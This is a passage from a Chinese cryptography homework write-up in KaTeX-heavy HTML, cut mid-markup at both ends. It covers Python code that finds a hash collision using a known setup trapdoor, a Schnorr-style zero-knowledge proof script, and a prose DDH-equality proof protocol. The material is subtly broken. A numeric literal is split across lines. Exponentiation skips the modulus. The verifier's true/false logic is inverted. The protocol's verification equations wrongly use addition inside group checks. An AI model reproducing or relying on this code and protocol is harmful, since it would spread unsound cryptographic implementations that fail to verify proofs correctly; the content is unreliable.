class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>找到一组哈希函数的碰撞。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ecc.curve <span class="keyword">import</span> P256</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">r_1 = random.randint(<span class="number">1</span>, P256.n)</span><br><span class="line">r_2 = random.randint(<span class="number">1</span>, P256.n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SetupInsecure</span>():</span><br><span class="line">    k = random.randint(<span class="number">1</span>, P256.n)</span><br><span class="line">    g = P256.G</span><br><span class="line">    h = g * k</span><br><span class="line">    <span class="keyword">return</span> g, h, k</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FindCol</span>(<span class="params">G, H, K</span>):</span><br><span class="line">    X_1 = <span class="number">416513513415135313314146874688647846876487</span></span><br><span class="line">    <span class="number">4686487468469831483619865466849646815468175647815</span></span><br><span class="line">    X_2 = r_1 * K + X_1 - r_2 * K</span><br><span class="line">    <span class="keyword">return</span> X_1, X_2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Hash</span>(<span class="params">G, H, M, r</span>):</span><br><span class="line">    h = G * M + H * r</span><br><span class="line">    <span class="keyword">return</span> h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">g, h, k = SetupInsecure()</span><br><span class="line">x_1, x_2 = FindCol(g, h, k)</span><br><span class="line">h_1 = Hash(g, h, x_1, r_1)</span><br><span class="line">h_2 = Hash(g, h, x_2, r_2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;x_1 = &quot;</span>, x_1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;x_2 = &quot;</span>, x_2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;r_1 = &quot;</span>, r_1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;r_2 = &quot;</span>, r_2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;g = &quot;</span>, g)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;h = &quot;</span>, h)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;k = &quot;</span>, k)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hash(K, M) = &quot;</span>, h_1.x)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hash(H, M) = &quot;</span>, h_2.x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> h_1 == h_2:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;True&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;False&quot;</span>)</span><br></pre></td></tr></table></figure>
<h1 id="零知识证明"><a class="markdownIt-Anchor" href="#零知识证明"></a> 零知识证明</h1>
<h2 id="问题3"><a class="markdownIt-Anchor" href="#问题3"></a> 问题3</h2>
<p>  在Prove函数中，首先计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo>=</mo><msup><mi>g</mi><mi>r</mi></msup></mrow><annotation encoding="application/x-tex">R=g^r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.858832em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span></span></span></span></span></span></span></span>，然后计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>z</mi><mo>=</mo><mi>x</mi><mo>∗</mo><mi>h</mi><mo>+</mo><mi>r</mi></mrow><annotation encoding="application/x-tex">z=x*h+r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>，最后返回<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo separator="true">,</mo><mi>h</mi><mo separator="true">,</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">R,h,z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">h</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span>。在Verif函数中，首先计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>g</mi><mi>z</mi></msup></mrow><annotation encoding="application/x-tex">g^z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.858832em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.04398em;">z</span></span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>f</mi><mi>h</mi></msup><mo>∗</mo><mi>R</mi></mrow><annotation encoding="application/x-tex">f^h*R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span>，然后判断两者是否相等，若相等则返回True，否则返回False。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">15161</span></span><br><span class="line">g = <span class="number">3</span></span><br><span class="line">x = <span class="number">101</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Prove</span>():</span><br><span class="line">    R = <span class="built_in">pow</span>(g, r)</span><br><span class="line">    <span class="comment"># print(R)</span></span><br><span class="line">    h = random.randint(<span class="number">1</span>, p)  <span class="comment"># hash函数太长了算不完，用randint替代一下</span></span><br><span class="line">    <span class="comment"># h=int(hashlib.md5(h).hexdigest(),16)</span></span><br><span class="line">    <span class="comment"># print(h)</span></span><br><span class="line">    z = x * h + r</span><br><span class="line">    <span class="keyword">return</span> R, h, z</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">pow</span>(g, x)</span><br><span class="line"><span class="comment"># print(f)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Verif</span>(<span class="params">z, h</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pow</span>(g, z) - <span class="built_in">pow</span>(f, h) * R) % p != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    r = random.randint(<span class="number">1</span>, p)</span><br><span class="line">    <span class="comment"># print(r)</span></span><br><span class="line">    R, h, z = Prove()</span><br><span class="line">    <span class="keyword">if</span> Verif(z, h):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;证明失败&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;证明成功&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="问题4"><a class="markdownIt-Anchor" href="#问题4"></a> 问题4</h2>
<p>  假设Alice为证明者，拥有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>，Bob为验证者。Alice想要证明<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mo>=</mo><mo stretchy="false">(</mo><mi>f</mi><mo separator="true">,</mo><mi>g</mi><mo separator="true">,</mo><mi>F</mi><mo>=</mo><msup><mi>f</mi><mi>r</mi></msup><mo separator="true">,</mo><mi>G</mi><mo>=</mo><msup><mi>g</mi><mi>r</mi></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">G=(f,g,F=f^r,G=g^r)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><br />
是一个DDH关系，但不能透露关于r的任意消息，Bob想要验证Alice的证明。Alice和Bob<br />
之间的交互如下：</p>
<p>  1、Alice随机生成一个随机数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>，并将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>f</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><msup><mi>f</mi><mi>k</mi></msup></mrow><annotation encoding="application/x-tex">{f}&#x27;=f^k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>g</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><msup><mi>g</mi><mi>k</mi></msup></mrow><annotation encoding="application/x-tex">{g}&#x27;=g^k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span></span></span>发送给Bob。</p>
<p>  2、Bob向Alice发送一个随机数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">s</span></span></span></span>。</p>
<p>  3、Alice计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>z</mi><mo>=</mo><mi>s</mi><mo>+</mo><mi>r</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">z=s+rk</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>，并将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>z</mi></mrow><annotation encoding="application/x-tex">z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span>发送给Bob。</p>
<p>  4、Bob验证<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>f</mi><mi>z</mi></msup><mo>=</mo><msup><mi>f</mi><mi>s</mi></msup><mo>+</mo><mi>F</mi><mo>∗</mo><msup><mi>f</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">f^z=f^s+F*{f}&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.04398em;">z</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>g</mi><mi>z</mi></msup><mo>=</mo><msup><mi>g</mi><mi>s</mi></msup><mo>+</mo><mi>G</mi><mo>∗</mo><msup><mi>g</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">g^z=g^s+G*{g}&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.858832em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.04398em;">z</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.858832em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>。</p>
<p>  5、重复上述过程。</p>
<p>  如果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mo>=</mo><mo stretchy="false">(</mo><mi>f</mi><mo separator="true">,</mo><mi>g</mi><mo separator="true">,</mo><mi>F</mi><mo separator="true">,</mo><mi>G</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">G=(f,g,F,G)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">G</span><span class="mclose">)</span></span></span></span>不存在DDH关系，那么假设<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo>=</mo><msup><mi>f</mi><msub><mi>r</mi><mn>1</mn></msub></msup><mo separator="true">,</mo><mi>G</mi><mo>=</mo><msup><mi>g</mi><msub><mi>r</mi><mn>2</mn></msub></msup></mrow><annotation encoding="application/x-tex">F=f^{r_1},G=g^{r_2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.02778em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.858832em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.02778em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>，Alice想要通过验证，就需要让<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>f</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">{f}&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>g</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">{g}&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord 